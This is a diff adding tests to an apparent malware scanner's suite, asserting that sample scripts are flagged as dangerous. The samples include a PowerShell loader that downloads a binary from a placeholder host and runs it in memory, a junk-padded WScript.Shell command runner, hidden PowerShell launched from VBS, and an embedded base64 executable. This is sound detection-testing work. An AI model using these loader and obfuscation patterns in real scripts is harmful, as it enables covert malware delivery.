@@ -220,3 +220,31 @@ def test_folder_scan(tmp_path):
     assert {"hud.lua", "lib/notes.txt", "lib/grab.lua", "pack.zip", "pack.zip/inner/readme.txt"} <= paths
     assert report.verdict is Verdict.DANGEROUS
     assert any(f.path == "lib/grab.lua" and f.severity is Severity.CRITICAL for f in report.findings)
+
+
+def test_giant_one_line_windows_script_is_dangerous(scan):
+    junk = "".join(f"x{i}" for i in range(60000))
+    code = f"var s=new ActiveXObject('WScript.Shell');var p='{junk}'.split('x').join('');s.Run(p);\n"
+    assert scan("invoice.js", code.encode()).verdict is Verdict.DANGEROUS
+
+
+def test_fileless_loader_is_dangerous(scan):
+    code = ("$b = (New-Object Net.WebClient).DownloadData('https://cdn.example.net/a.bin')\n"
+            "[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null, $null)\n")
+    assert scan("update.ps1", code.encode()).verdict is Verdict.DANGEROUS
+
+
+def test_windows_script_starting_powershell(scan):
+    code = ("Set sh = CreateObject(\"WScript.Shell\")\n"
+            "sh.Run \"powershell -nop -w hidden -c Start-Sleep 1\", 0, False\n")
+    assert scan("setup.vbs", code.encode()).verdict is not Verdict.CLEAN
+
+
+def test_gzipped_program_in_base64_is_found(scan):
+    import base64
+    import gzip
+
+    from samples import make_pe
+    payload = base64.b64encode(gzip.compress(make_pe({"kernel32.dll": ["ExitProcess"]}))).decode()
+    code = f"$d = '{payload}'\n$x = [Convert]::FromBase64String($d)\n"
+    assert "script.payload.embedded-exe" in checks(scan("run.ps1", code.encode()))
